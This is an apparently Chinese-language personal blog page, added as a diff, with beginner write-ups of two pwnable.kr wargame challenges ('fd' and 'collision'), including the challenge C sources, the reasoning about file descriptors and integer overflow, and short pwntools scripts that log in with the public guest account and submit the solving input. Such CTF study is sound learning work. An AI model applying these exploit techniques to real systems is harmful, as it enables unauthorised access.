@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>小白的PWN学习之路 | 麦芽屋</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="在pwnable的刷题记录，虽然只刷了几题，最后觉得这个领域可能还不适合现在的我。">
+<meta name="keywords" content="PWN,二进制">
+<meta property="og:type" content="article">
+<meta property="og:title" content="小白的PWN学习之路">
+<meta property="og:url" content="white3.github.io/2016/06/27/pwn_learn/index.html">
+<meta property="og:site_name" content="麦芽屋">
+<meta property="og:description" content="在pwnable的刷题记录，虽然只刷了几题，最后觉得这个领域可能还不适合现在的我。">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-07-29T04:30:05.482Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="小白的PWN学习之路">
+<meta name="twitter:description" content="在pwnable的刷题记录，虽然只刷了几题，最后觉得这个领域可能还不适合现在的我。">
+  
+    <link rel="alternate" href="/atom.xml" title="麦芽屋" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">麦芽屋</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">有趣的恶魔,无趣的枷锁</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="white3.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-pwn_learn" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/06/27/pwn_learn/" class="article-date">
+  <time datetime="2016-06-27T13:14:00.000Z" itemprop="datePublished">2016-06-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      小白的PWN学习之路
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>在pwnable的刷题记录，虽然只刷了几题，最后觉得这个领域可能还不适合现在的我。</p>
+<a id="more"></a>
+<h2 id="PWN入门第二式"><a href="#PWN入门第二式" class="headerlink" title="PWN入门第二式"></a>PWN入门第二式</h2><p>目前的战略是, 在刷题过程中学习, 可以最快发现自己不足的地方, 哪里不会学习哪里, 慢慢发现知识的相对重要, 再结合做题去学习.</p>
+<h3 id="刷题开始"><a href="#刷题开始" class="headerlink" title="刷题开始"></a>刷题开始</h3><p>在<a href="http://pwnable.kr">Play Game</a>刷的第二题. collision</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">col@ubuntu:~$ cat col.c </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">		res += ip[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">		system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过 C 代码我们发现程序的主要行为是, 判断输入的参数是否与hashcode相等.<br>但是, 其中长度为20的字符数组被强转为int类型的数组.又因为char为1个字节, int为4个字节,所以转为长度为4的int数组.<br>那么我们假设输入 2222 2222 2222 2222 2222<br>2 由ascii表 -&gt; 50D -&gt; 32H , 2222 -&gt; 32323232H -&gt; 842150450D = x(设未知数x)<br>然后我们发现当五个数相加时, 一定会超过int的最大值 2147483647.<br>当超过最大值, 数据溢出, 那么将做 -2147483648 运算.<br>不如我们直接假设 输入的值转换为int值为 x ,越界次数为 t, n0 = 2147483647, n1 = 2147483648.<br>那么<code>x*5 - n0*t - (n1 + 1)*t = hashcode ==&gt; x = (hashcode + (n1 + n0 + 1)*t)/5</code><br>(想想res突破int上界后, 掉到int下界, 然后是不是还有个0要越过,所以再+1)<br>然后直接带入 t=1, 算出 x = 972620284D -&gt; 39f901fcH</p>
+<p>直接写exploit吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">pwn_ssh=ssh(host='pwnable.kr',user='col',password='guest',port=2222)</span><br><span class="line">print (pwn_ssh.connected())</span><br><span class="line"></span><br><span class="line">sh=pwn_ssh.process(argv=['collision','\xfc\x01\xf9\x39' * 5],executable='./col')</span><br><span class="line">print (sh.recvall())</span><br></pre></td></tr></table></figure>
+<p>2018-02-27 13:14</p>
+<blockquote>
+<p>————————-透明的分割线——————–</p>
+</blockquote>
+<h2 id="PWN入门第一式"><a href="#PWN入门第一式" class="headerlink" title="PWN入门第一式"></a>PWN入门第一式</h2><h3 id="准备活动"><a href="#准备活动" class="headerlink" title="准备活动"></a>准备活动</h3><p>熟话说，欲先善其事，必先利其器.<br>请观看<a href="https://etenal.me/archives/972">ETenal</a>大佬的笔记来搭建环境.</p>
+<h3 id="在Play-Game刷的第一题"><a href="#在Play-Game刷的第一题" class="headerlink" title="在Play Game刷的第一题."></a>在<a href="http://pwnable.kr">Play Game</a>刷的第一题.</h3><p>萌新的我点开 fd 那个萌萌的粉红史莱姆.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Mommy! what is a file descriptor in Linux?</span><br><span class="line"></span><br><span class="line">* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://www.youtube.com/watch?v=blAxTfcW9VU</span><br><span class="line"></span><br><span class="line">ssh fd@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+<p>我们在ubuntu上输入,然后输入 密码 guest.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mzl@ubuntu:~$ ssh fd@pwnable.kr -p2222</span><br><span class="line">fd@pwnable.kr&apos;s password: </span><br><span class="line">____  __    __  ____    ____  ____   _        ___      __  _  ____</span><br><span class="line">|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ </span><br><span class="line">|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  &apos; / |  D  )</span><br><span class="line">|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / </span><br><span class="line">|  |  |  `  &apos;  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ </span><br><span class="line">|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \</span><br><span class="line">|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|</span><br><span class="line">                                                                     </span><br><span class="line">- Site admin : daehee87.kr@gmail.com</span><br><span class="line">- IRC : irc.netgarage.org:6667 / #pwnable.kr</span><br><span class="line">- Simply type &quot;irssi&quot; command to join IRC now</span><br><span class="line">- files under /tmp can be erased anytime. make your directory under /tmp</span><br><span class="line">- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal</span><br><span class="line">Last login: Sat Mar  3 23:53:04 2018 from *.*.*.*</span><br></pre></td></tr></table></figure>
+<p>首先我们来看一下都有些啥文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fd@ubuntu:~$ ls -l</span><br><span class="line">total 16</span><br><span class="line">-r-sr-x--- 1 fd_pwn fd   7322 Jun 11  2014 fd</span><br><span class="line">-rw-r--r-- 1 root   root  418 Jun 11  2014 fd.c</span><br><span class="line">-r--r----- 1 fd_pwn root   50 Jun 11  2014 flag</span><br></pre></td></tr></table></figure>
+<p>然后我们发现只有 fd.c 一个入口</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">fd@ubuntu:~$ cat fd.c </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">	<span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">	len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">		system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>函数:<br>atoi (表示 ascii to integer)是把字符串转换成整型数的一个函数.<br>strcmp(char<em> str1, char</em> str2) 若 str1 和 str2 字符串相同返回0.</p>
+<p>重要函数：read | ssize_t read(int fd,void * buf ,size_t count);<br>参数说明<br>fd 的值有三种(都为int类型)<br>当fd=0, read函数为标准输入流, 其他参数时, 1(标准输出流), 2(标准错误流).<br>buf所指向的内存可以比喻为流的载具, count为载具的容量.<br>务必再百度关键词 <a href="https://en.wikipedia.org/wiki/File_descriptor">file descriptor</a>, 查看官方描述.</p>
+<p>所以我们需要让read为标准输入, 即使 fd=0, 又因为 fd = (输入的值) - 0x1234(转换为十进制为4660).故输入 4660, 然后再输入 LETMEWIN 再回车即可.演示如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fd@ubuntu:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure>
+<p>最后来一个python的exploit<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">pwn_ssh=ssh(host=<span class="string">'pwnable.kr'</span>,user=<span class="string">'fd'</span>,password=<span class="string">'guest'</span>,port=<span class="number">2222</span>)</span><br><span class="line"><span class="keyword">print</span> (pwn_ssh.connected())</span><br><span class="line">sh=pwn_ssh.process(argv=[<span class="string">'fd'</span>,<span class="string">'4660'</span>],executable=<span class="string">'./fd'</span>)</span><br><span class="line">sh.sendline(<span class="string">"LETMEWIN"</span>)</span><br><span class="line"><span class="keyword">print</span> (sh.recvall())</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="white3.github.io/2016/06/27/pwn_learn/" data-id="cjkwbsim60014f4jteni67v2i" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/二进制/">二进制</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/01/03/questions/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          迷途中遇到的小知识集
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/02/27/binwalk使用教程/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Hello World</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF杂项/">CTF杂项</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CURL/">CURL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JSP/">JSP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MIPS汇编/">MIPS汇编</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MYSQL/">MYSQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Maven/">Maven</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/">PWN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/install/">install</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/question/">question</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web安全/">web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/二进制/">二进制</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/内网/">内网</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/基础/">基础</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/安装/">安装</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/小文/">小文</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/工具/">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/扫描/">扫描</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/模板/">模板</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/笔记/">笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编码/">编码</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编程/">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/配置/">配置</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/随笔/">随笔</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF杂项/" style="font-size: 10px;">CTF杂项</a> <a href="/tags/CURL/" style="font-size: 10px;">CURL</a> <a href="/tags/JSP/" style="font-size: 10px;">JSP</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/MIPS汇编/" style="font-size: 10px;">MIPS汇编</a> <a href="/tags/MYSQL/" style="font-size: 10px;">MYSQL</a> <a href="/tags/Maven/" style="font-size: 10px;">Maven</a> <a href="/tags/PWN/" style="font-size: 10px;">PWN</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/install/" style="font-size: 10px;">install</a> <a href="/tags/question/" style="font-size: 10px;">question</a> <a href="/tags/web安全/" style="font-size: 15px;">web安全</a> <a href="/tags/二进制/" style="font-size: 10px;">二进制</a> <a href="/tags/内网/" style="font-size: 10px;">内网</a> <a href="/tags/基础/" style="font-size: 10px;">基础</a> <a href="/tags/安装/" style="font-size: 10px;">安装</a> <a href="/tags/小文/" style="font-size: 10px;">小文</a> <a href="/tags/工具/" style="font-size: 15px;">工具</a> <a href="/tags/扫描/" style="font-size: 10px;">扫描</a> <a href="/tags/模板/" style="font-size: 20px;">模板</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a> <a href="/tags/编码/" style="font-size: 15px;">编码</a> <a href="/tags/编程/" style="font-size: 10px;">编程</a> <a href="/tags/配置/" style="font-size: 10px;">配置</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/08/16/mysql/">MYSQL的学习</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/16/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/02/Linux的inode号/">Linux/unix上神奇的inode编号</a>
+          </li>
+        
+          <li>
+            <a href="/2018/07/29/PUNYCODE编码协议/">PUNYCODE</a>
+          </li>
+        
+          <li>
+            <a href="/2018/07/29/docker/">Docker基础学习</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 Menzel3<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
